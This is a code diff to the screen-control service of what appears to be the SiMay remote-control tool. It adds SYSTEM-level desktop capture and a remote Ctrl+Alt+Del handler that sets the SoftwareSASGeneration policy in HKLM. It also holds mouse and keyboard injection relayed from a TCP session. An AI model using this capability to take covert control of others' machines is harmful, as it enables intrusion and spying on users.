@@ -16,7 +16,11 @@ using System.Drawing;
 using System.Runtime.InteropServices;
 using System.Threading;
 using System.Windows.Forms;
-using static SiMay.ServiceCore.Win32Api;
+using static SiMay.ServiceCore.CommonWin32Api;
+using SiMay.ServiceCore.Win32;
+//using static SiMay.ServiceCore.Win32.User32;
+using SiMay.Basic;
+using SiMay.ServiceCore.ApplicationService.Registry;
 
 namespace SiMay.ServiceCore.ApplicationService
 {
@@ -59,7 +63,13 @@ namespace SiMay.ServiceCore.ApplicationService
                     OriginName = Environment.MachineName + "@" + (AppConfiguartion.RemarkInfomation ?? AppConfiguartion.DefaultRemarkInfo)
                 });
 
-            _spy = new ScreenSpy();
+            ICapturer capturer;
+            if (AppConfiguartion.HasSystemAuthority.Equals("true", StringComparison.OrdinalIgnoreCase))
+                capturer = new SwitchDesktopBitBltCapture();
+            else
+                capturer = new BitBltCapture();
+
+            _spy = new ScreenSpy(capturer);
             _spy.OnDifferencesNotice += ScreenDifferences_OnDifferencesNotice;
         }
 
@@ -142,6 +152,14 @@ namespace SiMay.ServiceCore.ApplicationService
                 _spy.FullFindDifferences(ishotRegtionScan, new Rectangle(rect.X, rect.Y, rect.Width, rect.Height));
         }
 
+        [PacketHandler(MessageHead.S_SCREEN_CTRL_ALT_DEL)]
+        public void CtrlAltDelHandler(TcpSocketSaeaSession session)
+        {
+            var registryKey = RegistryEditor.GetWritableRegistryKey(@"HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System");
+            registryKey.SetValue("SoftwareSASGeneration", 00000003, Microsoft.Win32.RegistryValueKind.DWord);
+            User32.SendSAS(false);
+        }
+
         [PacketHandler(MessageHead.S_SCREEN_CHANGESCANMODE)]
         public void ChangeSpyScanMode(TcpSocketSaeaSession session)
         {
@@ -185,21 +203,24 @@ namespace SiMay.ServiceCore.ApplicationService
             switch (@event.Key)
             {
                 case MOUSEKEY_ENUM.Move:
+                    //SendMouseMove(p1, p2);
                     SetCursorPos(p1, p2);
                     break;
 
                 case MOUSEKEY_ENUM.LeftDown:
+                    //SendLeftMouseDown(p1, p2);
                     SetCursorPos(p1, p2);
                     mouse_event(MOUSEEVENTF_LEFTDOWN, 0, 0, 0, 0);
                     break;
 
                 case MOUSEKEY_ENUM.LeftUp:
+                    //SendLeftMouseUp(p1, p2);
                     SetCursorPos(p1, p2);
                     mouse_event(MOUSEEVENTF_LEFTUP, 0, 0, 0, 0);
                     break;
 
                 case MOUSEKEY_ENUM.MiddleDown:
-                    SetCursorPos(p1, p2);
+                    User32.SetCursorPos(p1, p2);
                     mouse_event(MOUSEEVENTF_MIDDLEDOWN, 0, 0, 0, 0);
                     break;
 
@@ -209,27 +230,111 @@ namespace SiMay.ServiceCore.ApplicationService
                     break;
 
                 case MOUSEKEY_ENUM.RightDown:
+                    //SendRightMouseDown(p1, p2);
                     SetCursorPos(p1, p2);
                     mouse_event(MOUSEEVENTF_RIGHTDOWN, 0, 0, 0, 0);
                     break;
 
                 case MOUSEKEY_ENUM.RightUp:
+                    //SendRightMouseUp(p1, p2);
                     SetCursorPos(p1, p2);
                     mouse_event(MOUSEEVENTF_RIGHTUP, 0, 0, 0, 0);
                     break;
 
                 case MOUSEKEY_ENUM.Wheel:
                     mouse_event(MOUSEEVENTF_WHEEL, 0, 0, p1, 0);
+                    //SendMouseWheel(p1);
                     break;
 
                 case MOUSEKEY_ENUM.KeyDown:
                     keybd_event((byte)p1, 0, 0, 0);
+                    //SendKeyDown(p1.ConvertTo<VirtualKey>());
                     break;
 
                 case MOUSEKEY_ENUM.KeyUp:
+                    //SendKeyUp(p1.ConvertTo<VirtualKey>());
                     keybd_event((byte)p1, 0, WM_KEYUP, 0);
                     break;
             }
         }
+        //public void SendKeyDown(VirtualKey keyCode)
+        //{
+        //    var union = new InputUnion()
+        //    {
+        //        ki = new KEYBDINPUT()
+        //        {
+        //            wVk = keyCode,
+        //            wScan = 0,
+        //            time = 0,
+        //            dwExtraInfo = GetMessageExtraInfo()
+        //        }
+        //    };
+        //    var input = new INPUT() { type = InputType.KEYBOARD, U = union };
+        //    SendInput(1, new INPUT[] { input }, INPUT.Size);
+        //}
+        //public void SendKeyUp(VirtualKey keyCode)
+        //{
+        //    var union = new InputUnion()
+        //    {
+        //        ki = new KEYBDINPUT()
+        //        {
+        //            wVk = keyCode,
+        //            wScan = 0,
+        //            time = 0,
+        //            dwFlags = KEYEVENTF.KEYUP,
+        //            dwExtraInfo = GetMessageExtraInfo()
+        //        }
+        //    };
+        //    var input = new INPUT() { type = InputType.KEYBOARD, U = union };
+        //    SendInput(1, new INPUT[] { input }, INPUT.Size);
+        //}
+
+        //public uint SendLeftMouseDown(double percentX, double percentY)
+        //{
+        //    var union = new InputUnion() { mi = new MOUSEINPUT() { dwFlags = MOUSEEVENTF.ABSOLUTE | MOUSEEVENTF.LEFTDOWN | MOUSEEVENTF.VIRTUALDESK, dx = (int)percentX, dy = (int)percentY, time = 0, mouseData = 0, dwExtraInfo = GetMessageExtraInfo() } };
+        //    var input = new INPUT() { type = InputType.MOUSE, U = union };
+        //    return SendInput(1, new INPUT[] { input }, INPUT.Size);
+        //}
+        //public uint SendLeftMouseUp(double percentX, double percentY)
+        //{
+        //    var union = new InputUnion() { mi = new MOUSEINPUT() { dwFlags = MOUSEEVENTF.ABSOLUTE | MOUSEEVENTF.LEFTUP | MOUSEEVENTF.VIRTUALDESK, dx = (int)percentX, dy = (int)percentY, time = 0, mouseData = 0, dwExtraInfo = GetMessageExtraInfo() } };
+        //    var input = new INPUT() { type = InputType.MOUSE, U = union };
+        //    return SendInput(1, new INPUT[] { input }, INPUT.Size);
+        //}
+
+        //public uint SendRightMouseDown(double percentX, double percentY)
+        //{
+        //    var union = new InputUnion() { mi = new MOUSEINPUT() { dwFlags = MOUSEEVENTF.ABSOLUTE | MOUSEEVENTF.RIGHTDOWN | MOUSEEVENTF.VIRTUALDESK, dx = (int)percentX, dy = (int)percentY, time = 0, mouseData = 0, dwExtraInfo = GetMessageExtraInfo() } };
+        //    var input = new INPUT() { type = InputType.MOUSE, U = union };
+        //    return SendInput(1, new INPUT[] { input }, INPUT.Size);
+        //}
+        //public uint SendRightMouseUp(double percentX, double percentY)
+        //{
+        //    var union = new InputUnion() { mi = new MOUSEINPUT() { dwFlags = MOUSEEVENTF.ABSOLUTE | MOUSEEVENTF.RIGHTUP | MOUSEEVENTF.VIRTUALDESK, dx = (int)percentX, dy = (int)percentY, time = 0, mouseData = 0, dwExtraInfo = GetMessageExtraInfo() } };
+        //    var input = new INPUT() { type = InputType.MOUSE, U = union };
+        //    return SendInput(1, new INPUT[] { input }, INPUT.Size);
+        //}
+
+        //public uint SendMouseMove(double percentX, double percentY)
+        //{
+        //    var union = new InputUnion() { mi = new MOUSEINPUT() { dwFlags = MOUSEEVENTF.ABSOLUTE | MOUSEEVENTF.MOVE | MOUSEEVENTF.VIRTUALDESK, dx = (int)percentX, dy = (int)percentY, time = 0, mouseData = 0, dwExtraInfo = GetMessageExtraInfo() } };
+        //    var input = new INPUT() { type = InputType.MOUSE, U = union };
+        //    return SendInput(1, new INPUT[] { input }, INPUT.Size);
+        //}
+
+        //public uint SendMouseWheel(int deltaY)
+        //{
+        //    if (deltaY < 0)
+        //    {
+        //        deltaY = -120;
+        //    }
+        //    else if (deltaY > 0)
+        //    {
+        //        deltaY = 120;
+        //    }
+        //    var union = new InputUnion() { mi = new User32.MOUSEINPUT() { dwFlags = MOUSEEVENTF.WHEEL, dx = 0, dy = 0, time = 0, mouseData = deltaY, dwExtraInfo = GetMessageExtraInfo() } };
+        //    var input = new INPUT() { type = InputType.MOUSE, U = union };
+        //    return SendInput(1, new User32.INPUT[] { input }, INPUT.Size);
+        //}
     }
 }
